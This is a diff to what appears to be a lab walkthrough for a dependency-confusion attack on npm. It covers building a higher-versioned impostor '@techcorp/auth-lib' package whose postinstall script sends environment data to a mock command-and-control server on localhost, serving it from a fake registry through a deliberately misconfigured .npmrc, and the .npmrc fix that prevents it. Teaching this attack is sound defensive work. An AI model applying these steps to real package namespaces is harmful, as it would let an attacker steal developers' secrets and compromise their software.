@@ -107,11 +107,11 @@ cd scenarios/02-dependency-confusion
 ```
 
 **What this does:**
-- Creates directory structure
-- Sets up internal packages (simulating TechCorp's private packages)
-- Creates leaked data (simulating reconnaissance)
-- Sets up detection tools
-- Creates validation scripts
+- Creates internal packages and attacker package (`@techcorp/auth-lib@999.999.999`)
+- Packs attacker tarball and builds fake public registry metadata (`work/`)
+- Creates `corporate-app/.npmrc` with vulnerable `@techcorp:registry=http://localhost:4874/`
+- Sets up `infrastructure/registry-server.js` (port **4874**) and mock C2 (port **3000**)
+- Prepares `detection-tools/dependency-confusion-scanner.js`
 
 **Expected output:**
 - You'll see setup progress messages
@@ -207,117 +207,82 @@ cat internal-packages/@techcorp/auth-lib/package.json
 - It's a legitimate authentication library
 - Clean, straightforward code
 
-### Step 2: Create the Malicious Package
+### Step 2: Review the Attacker Package (Pre-built by setup)
 
-Now we'll create a malicious version that mimics the legitimate one:
+`setup.sh` already copies the malicious template and packs the attacker tarball:
 
 ```bash
-# Navigate to attacker packages directory
-cd attacker-packages/@techcorp/auth-lib
-
-# Copy the template
-cp ../../templates/dependency-confusion-template.js index.js
-
-# Create package.json with HIGH version number
-cat > package.json << 'EOF'
-{
-  "name": "@techcorp/auth-lib",
-  "version": "999.999.999",
-  "description": "TechCorp Authentication Library [MALICIOUS - EDUCATIONAL]",
-  "main": "index.js",
-  "keywords": ["auth", "authentication", "techcorp"],
-  "author": "Attacker (Educational Demo)",
-  "license": "MIT"
-}
-EOF
+cat attacker-packages/@techcorp/auth-lib/package.json
+cat attacker-packages/@techcorp/auth-lib/postinstall.js | head -30
 ```
 
 **Key Points:**
-- **Same name**: `@techcorp/auth-lib` (matches internal package)
-- **Higher version**: `999.999.999` (much higher than internal `1.0.0`)
-- **Malicious code**: Will exfiltrate data while providing basic functionality
+- **Same name**: `@techcorp/auth-lib`
+- **Higher version**: `999.999.999` (beats internal `1.x`)
+- **postinstall**: Exfiltrates at `npm install` time (no `npm start` required)
 
-### Step 3: Review the Malicious Template
+### Step 3: Inspect the Vulnerable `.npmrc`
 
 ```bash
-cat index.js
+cat corporate-app/.npmrc
 ```
 
-**What it does:**
-- Provides the same basic functionality (to avoid suspicion)
-- Collects environment variables
-- Sends data to attacker server
-- Runs automatically when imported
+**The misconfiguration:** `@techcorp:registry` points to the attacker's fake public registry (`localhost:4874`) instead of TechCorp's internal registry.
 
-**Safety features:**
-- Only works when `TESTBENCH_MODE=enabled`
-- Only sends to `localhost:3000` (not real attackers)
+### Step 4: Start the Mock C2 and Fake Public Registry
 
-### Step 4: Start the Mock Attacker Server
-
+**Terminal A** — mock C2:
 ```bash
-# Go back to scenario root (from attacker-packages/@techcorp/auth-lib)
-cd ../../..
-
-# Start mock server (in a separate terminal, if not already running)
-node infrastructure/mock-server.js &
+node infrastructure/mock-server.js
 ```
 
-**Verify it's running:**
+**Terminal B** — attacker-controlled registry:
 ```bash
-curl http://localhost:3000/captured-data
+node infrastructure/registry-server.js
 ```
 
-Should return: `{"captures": []}`
-
-### Step 5: Install the Malicious Package (Simulating the Attack)
-
-Now let's simulate what happens when a developer runs `npm install`:
-
+**Verify registry is serving the malicious package:**
 ```bash
-# Navigate to corporate app
+curl -s http://localhost:4874/@techcorp%2Fauth-lib | jq '.["dist-tags"]'
+# Expected: {"latest":"999.999.999"}
+```
+
+### Step 5: Run `npm install` (The Real Attack)
+
+**Terminal C:**
+```bash
 cd corporate-app
-
-# Clear any existing installations
 rm -rf node_modules package-lock.json
-
-# Install dependencies (this will prefer the malicious package!)
-npm install ../attacker-packages/@techcorp/auth-lib
+npm cache clean --force
+export TESTBENCH_MODE=enabled
+npm install
 ```
 
 **What just happened:**
-- npm checked for `@techcorp/auth-lib`
-- Found version `999.999.999` in the attacker package
-- Found version `1.0.0` in internal packages
-- **Installed the higher version (999.999.999) - the malicious one!**
+1. npm read `.npmrc` → `@techcorp:registry=http://localhost:4874/`
+2. Queried the fake registry for `@techcorp/auth-lib`
+3. Downloaded `v999.999.999` tarball (higher than any internal version)
+4. `postinstall.js` fired during install → data sent to mock C2 on `:3000`
 
-### Step 6: Run the Corporate Application
+### Step 6: Run the Corporate Application (Still Works)
 
 ```bash
-# Make sure TESTBENCH_MODE is enabled
 export TESTBENCH_MODE=enabled
-
-# Run the application
 npm start
 ```
 
-**What to expect:**
-- The application will start
-- The malicious package will execute
-- Data will be exfiltrated to the mock server
+The app runs normally — the attack was silent during install.
 
 ### Step 7: Verify the Compromise
 
 ```bash
-# Check which version was installed
 npm list @techcorp/auth-lib
-
-# View the installed package
-cat node_modules/@techcorp/auth-lib/package.json
-
-# Check captured data
-curl http://localhost:3000/captured-data
+curl -s http://localhost:3000/captured-data | jq
 ```
+
+**Look for:**
+- Installed version: `999.999.999`
+- Capture with `"phase": "postinstall"` and `"registrySource": "...4874..."`
 
 **What you should see:**
 - Version installed: `999.999.999` (malicious version)
@@ -428,8 +393,8 @@ Now that we've seen how the attack works, how can we prevent it?
 cd corporate-app
 
 cat > .npmrc << 'EOF'
-# Private packages from private registry ONLY
-@techcorp:registry=http://localhost:4873/
+# Private packages from INTERNAL registry ONLY (correct configuration)
+@techcorp:registry=https://internal-registry.techcorp.local/
 
 # Public packages from public registry
 registry=https://registry.npmjs.org/
@@ -738,19 +703,31 @@ See [observability/README.md](../../../observability/README.md) for stack detail
 
 ## 🆘 Troubleshooting
 
-### Problem: "Package not found"
+### Problem: "Package not found" or no capture
 
 **Solution:**
 ```bash
-# Make sure you're using the correct path
-cd scenarios/02-dependency-confusion
-npm install ../attacker-packages/@techcorp/auth-lib
+# Ensure both servers are running
+node infrastructure/mock-server.js &          # :3000
+node infrastructure/registry-server.js &      # :4874
+
+# Rebuild registry if work/ is missing
+node infrastructure/build-registry.js
+
+cd corporate-app
+rm -rf node_modules package-lock.json
+npm cache clean --force
+export TESTBENCH_MODE=enabled
+npm install
 ```
 
-### Problem: "Wrong version installed"
+### Problem: "Wrong version installed" or still using file: path
 
 **Solution:**
 ```bash
+# Confirm vulnerable .npmrc points @techcorp to attacker registry (lab)
+cat corporate-app/.npmrc
+
 # Clear cache and reinstall
 npm cache clean --force
 rm -rf node_modules package-lock.json
